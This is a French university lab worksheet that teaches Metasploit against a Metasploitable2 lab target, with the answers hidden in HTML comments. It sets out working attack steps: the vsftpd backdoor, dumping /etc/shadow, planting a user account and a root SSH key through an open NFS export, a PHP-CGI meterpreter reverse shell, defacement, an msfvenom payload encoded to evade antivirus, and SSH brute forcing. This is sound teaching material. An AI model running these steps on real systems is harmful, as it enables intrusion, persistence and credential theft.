<!--

TODO avant de lancer le TP :

o Instancier une VM snap-docker-ready
o docker pull tleemcjr/metasploitable2
o docker run --name metasploitable2 -it tleemcjr/metasploitable2:latest sh -c "/bin/services.sh && bash"
--
o ouvrir les ports :
	21,6200
	80,4444
	



-->



# TP Metasploit

> Responsables : Jp Gelas, Thomas Begin

- - - 

**Objectif :** Découvrir et prendre en main les fonctionnalités de base du framework Metasploit.

![Metasploit](img/metasploit.png)

Metasploit est un framework qui aide à trouver et à exploiter des vulnérabilités.

Le framework Metasploit est l'un des outils de test les plus utiles dont disposent les professionnels de la sécurité (les pentesteurs). Grâce à Metasploit, vous pouvez accéder aux exploits divulgués pour une grande variété d'applications et de systèmes d'exploitation. Vous pouvez automatiquement analyser, tester et exploiter des systèmes en utilisant du code que d'autres pentesteurs, hackers ou pirates ont écrit.

Metasploit fournit également une plateforme de développement qui vous permet d'écrire vos propres outils de sécurité ou d'exploiter du code. Nous n'aborderons pas cette partie dans ce TP.

Ce TP est une introduction aux bases de l'utilisation de Metasploit. A savoir, comment  utiliser le framework et exploiter une vulnérabilité.

### Démarrage de Metasploit

Instancier une VM avec l'image `Kali Linux 2020.3` (créez un nouveau volume de 30GB a supprimer lors de la destruction de la VM), 
selectionner un *flavor* `m1.small` et votre clé SSH si vous en aviez plusieurs. 
Cette image contient le framework Metasploit pré installé. Notez que la distribution *Kali Linux* vient avec Metasploit pré installé.

Pour vous connecter à la VM vous saisirez la commande suivante : `ssh -i ~/maclé kali@adresseIPdeMaVM` (noté le login: **kali**).
Pour devenir root le mot de passe est **toor** (exemple: `su -` ou `sudo su -` pour ne pas avoir à taper de mot de passe).

Pour lancer le framework il suffit de saisir la commande `msfconsole` dans un terminal (Attention c'est lent la premiére fois). 
L'invite devient `msf5>`. 
La première commande que vous pouvez saisir est la commande `help` qui permet d'afficher le menu d'aide (et `banner` pour le fun).


```
$ msfconsole
msf> help
...
```

Vous pouvez ensuite saisir la commande `search` pour obtenir la liste du ou des modules en lien avec le mot clé que vous passerez en paramètre. 
Par exemple la commande suivante listera tous les scripts et exploits en lien avec MySql.

```
msf> search mysql
```

**Astuce :** La commande `help search` permet d'obtenir la liste des filtres qui peuvent être utilisé avec la commande `search`.

La commande `info` affiche des informations supplémentaires.

```
msf> info exploit/linux/http/librenms_collectd_cmd_inject
```

Une fois que vous avez décidé quel module utiliser, saisissez la commande `use` pour le selectionner. Cela modifiera le contexte de vos commandes et vous permettra d'exécuter des commandes spécifiques à ce module.

```text
msf> use exploit/linux/http/librenms_collectd_cmd_inject
msf exploit(linux/http/librenms_collectd_cmd_inject) >
```

### Exploiter des vulnerabilités avec Metasploit

Maintenant que vous êtes à l'intérieur d'un module, saisissez la commande `options` pour voir ce que vous pouvez configurer avec la commande `set`.


```text
msf exploit(linux/http/librenms_collectd_cmd_inject) > options
...
msf exploit(linux/http/librenms_collectd_cmd_inject) > set RHOSTS 192.168.1.254
```
Vous devrez définir toutes les variables requises avant de pouvoir exécuter l'exploit.
Une fois vos *settings* terminé vous pouvez saisir à nouveau la commande `options` pour vérifier la bonne prise en compte de vos paramètres.

Dans Metasploit, `LHOST`, `RHOST` et `SRVHOST` sont parmi les noms de variables les plus couramment utilisés. 

  - `LHOST` fait référence à l'adresse IP de votre machine, qui est généralement utilisée pour créer une connexion inverse à votre machine une fois l'attaque réussie. 
  - `RHOST` fait référence à l'adresse IP de l'hôte cible. 
  - `SRVHOST` est l'adresse à laquelle le module se connectera pour télécharger des *payloads* supplémentaires.

Enfin, une fois la configuration terminée, vous pouvez lancer la commande `exploit` pour lancer l'exploit !

```
msf exploit(linux/http/librenms_collectd_cmd_inject) > exploit
```
--- 

# A vous de jouer

A présent à vous de jouer.

Notez l'adresse IP de la machine cible (demandez la à vos enseignants). 
Vous initialiserez plus tard la variable `RHOST` avec cette adresse.
 
```text
_____ . _____ . _____ . _____ 
```
  
Lancez un scan sur la cible avec la commande `nmap`. 
Quelle(s) option(s) utilisez vous pour obtenir la liste des ports ouverts, le nom du service et sa version ?
  <!-- nmap -sV @IPtarget -->

```text
$ nmap ..........  _____ . _____ . _____ . _____
```

---

### Exploit 1 : Exploitation d'une backdoor (vsftpd) 

<!--
https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/
-->
  
  Relevez le nom et la version du service ftp (21/tcp).
  <!-- vsftpd 2.3.4 -->
```text
  
```

Lancez le framework Metasploit si ce n'est déjà fait.
    
Combien d'exploits sont mis à votre disposition ?

<!-- plus de 2000 -->

```text
  
```

Quelle commande de recherche allez vous saisir dans la console de Metasploit pour savoir si un (ou plusieurs) exploits sont disponibles pour exploiter ce service ftp en particulier.

<!-- search vsftpd -->

```text
  
```

Quelle est le résultat ? (notez le chemin et nom du module, date, rang,...)

<!-- exploit/unix/ftp/vsftpd_234_backdoor 2011 excellent -->

```text
  
```

Comment obtenir plus d'information sur cet exploit dans la console msf ?

<!-- info  exploit/unix/ftp/vsftpd_234_backdoor -->

```text
  
```

Notez dans la section _Basic options_ quelle(s) variable(s) devez vous configurer ?

<!--  RHOST -->

```text
  
```

Selectionnez l'exploit avec la commande `use`.

<!-- use exploit/unix/ftp/vsftpd_234_backdoor -->

```text
  
```

Quel est le nouvel invite de la ligne de commande ?

<!-- msf exploit(vsftpd_234_backdoor)>_ -->

```text
  
```

Initialisez `RHOST` avec `set` puis lancez l'exploit.

<!-- set RHOST @IPtarget ; exploit -->

```text
  
```

Un lien de communication devrait être établi entre la machine attaquante (msf) et 
la machine  cible (vsftpd). Remarquez que les ports utilisés sont différents de 21 
(port ftp standard).

Bien que l'invite soit nul, vous pouvez saisir des commandes (ex: `ls`, `pwd`, ...)


**Astuce** : Pour avoir un invite plus sympthique, la commande suivante *spawn* un pseudo-terminal `python -c 'import pty; pty.spawn("/bin/sh")'`. 

Quelles commandes saisir pour connaitre votre rôle (ou niveau de privilège) sur la cible ?

<!-- id ; whoami -->

```text
  
```

Récupérez la version hashé des mots de passe. Vous pourrez l'utiliser plus tard avec un dictionnaire et un outil comme john (the ripper). 

<!--  cat /etc/shadow -->

```text
  
```

Profitez-en également pour vous assurez un retour facile sur cette machine compromise en vous créant un compte (pas très discret) 

<!-- adduser hacker OU useradd -m -d /home/hacker -c "" -s /bin/bash hacker 
  -m = create home 
  -s = shell 
  -->

```text

```

---

### Exploit 2 : Exploitation d'un service mal configuré (NFS)

Le résultat du scan précédent laisse apparaitre l'exposition d'un service NFS.
Avec la commande `showmount` sur la machine attaquante déterminez quelle partie de l'arborescence est exposé ?
<!-- showmount -e @IPcible -->
```text
  showmount -... ____.____.____.____
```
Quelle répertoire est *montable* ? Qui peut y accéder ?
<!-- 
Le répertoire moutable est la racine (/) !!!
Toutes les adresses IP y ont accès (*) !!! 
-->
```text
  
```

Pour vous assurez de la possibilité d'exploiter cette faille de configuration du service NFS, créez vous un point de montage et montez ce répetoire distant sur votre poste.
<!-- mkdir racine ; mount [-o nolock] -t nfs @IPcible:/ ./racine -->
```text

```

Profitez-en pour vous assurez un retour facile sur cette machine compromise en vous créant un accès plus discret en ajoutant votre clé publique ssh au fichier *authorized_keys* de root.  
  <!-- 
ssh_keygen
cat id_rsa >> ./racine/root/.ssh/authorized_keys
umount racine
ssh -i id_rsa root@_IP cible_
  -->
```text

```

---

### Exploit 3 : Service Web vulnerable (php + meterpreter)

Essayez de déterminer quelle version de php est utilisé sur la machine cible.
L'outil `dirbuster` ou `dirb` permet de découvrir la présence d'un fichier `phpinfo.php`. 
Appelez le avec votre navigateur. Quelle version est utilisé ?
<!-- 5.2.4 -->
```text
    ___ . ___ . ___
```
Cette version PHP est connue pour être vulnerable à *PHPCGI Argument Injection*.

Quelles sont les arguments a passer à la commande `search` pour retrouver le nom exact de ce module sachant 
qu'il date de 2012 (cve:2012) et qu'il est classé comme excellent (rank: excellent).

<!-- search cve:2012 rank:excellent php cgi argument injection -->

```text
search ...
```

Utilisez le framework pour exploiter cette vulnerabilité.
<!-- 
use exploit/multi/http/php_cgi_arg_injection
set RHOST @IPcible
show payloads
set payload php/meterpreter/reverse_tcp
set LHOST @IPattaquant
run
meterpreter > shell
-->
```text
  



```

**Astuce :** Utilisez le payload `php/meterpreter/reverse_php`. 

Notez que deux *payload* sont fondamentaux.

  - `...bind_tcp` : connection direct de la machine attaquante vers la machine cible.
  - `...reverse_tcp` : la machine cible exécute le payload et se connecte à la machine attaquante.

#### Defacing 
Modifiez la page web d'accueil (index.php) en y inscrivant un message de propagande amusant (Ex: Vive les pingoins !).
<!-- sed -i -e 's/Warning/Hacked/g index.php -->

---

### Exploit 4 : Injection (msfvenom)

L'outil `msfvenom` est inclus dans le framework metasploit. Il est la fusion des anciens outils *msfpayload* et *msfencode*. 
`msfvenom` nous servira à la création sur mesure de payload avec possibilité d'encodage (voir même multi-encodage) pour échapper aux antivirus par exemple.

L'outil se lance dans un terminal. Sa documentation est accessible avec l'option `-h`.

```text
msfvenom -h
```

msfvenom propose un grand nombre de **payload** (`msfvenom --list payload`).

**Astuce** : Pour connaitre les options requise a un payload, vous pouvez utiliser la msfconsole.

Créez et spécifiez un payload (`-p linux/x86/meterpreter/reverse_tcp`) et son format (`-f elf`)
<!-- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=@IPattaquant LPORT=4444 -f elf > runmeplz -->
```text
msfvenom -p ....................... -f ... LHOST=____.____.____.____ LPORT=.... > runmeplz
```

A présent, dans la msfconsole nous allons lancer le module d'écoute en le paramétrant avec les même paramétres que ceux utilisé pour générer notre payload ci-avant.

```text
use exploit/multi/handler 
set payload linux/x86/meterpreter/reverse_tcp
set LPORT 4444
set LHOST @IPattaquant
show info
exploit -j -z
```

Déployer et lancez le payload sur la machine cible (par le moyen de votre choix). 
En vérité vous pousseriez la victime a lancer l'exécution de ce binaire sur son poste de travail.

Une fois la console `meterpreter` démarrée vous pouvez commencer une nouvelle phase de post-exploitation.

```text
meterpreter> help
meterpreter> sysinfo
...
```

#### A propos d'encodage (optionnel)

L'objectif de ce type d'encodeur est de modifier le code du payload sans pour autant en modifier son fonctionnement.

Vous pouvez vérifier l'efficacité de votre encodage sur [virustotal.com](http://virustotal.com) par exemple.

Sans encodage (payload brute), combien d'antivirus détecte que votre payload est un *Trojan* ?

A présent appliquez un (ou plusieurs) encodage.  

```text
msfvenom --list encoders 
```

Nous vous recommandons a minima l'encodeur *shikata ga nai*. Vérifié l'efficacité de votre encodage. Que constatez-vous ?

---

### Exploit 5 : Scanner (smb_enumusers) et bruteforce

```text
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS ___.___.___.___
run
```
Vous devriez obtenir une liste de nom d'utilisateurs (msfadmin, klog, sys, user, service).

En vous appuyant sur le dictionnaire *rockyou.txt* (disponible sur Kali dans /usr/share/wordlists/) par exemple et un outil comme *hydra*, *patator* ou *ncrack* 
tentez de déterminer le mot de passe du compte *klog* sur le service ssh.

<!-- 
hydra -l klog -P ./rockyou.txt @_IP_cible ssh #(OK)

patator ssh_login user=klog password=FILE0 0=./rockyou.txt host=@IPcible \
 -x ignore:mesg='Authentication failed.' #(OK)

ncrack -p22 --user klog -P ./rockyou.txt @IPcible #(KO)
--
-->

---

### Exploit 6 : port 5900

```text
use auxiliary/scanner/vnc/vnc_login
set RHOSTS @IPcible
set USERNAME root
run
```

Quel mot de passe est associé à ce username ?

```text
Login successful : ___________
```
Dans un terminal

```text
vncviewer @IPcible
```
Mot de passe : ___________



---
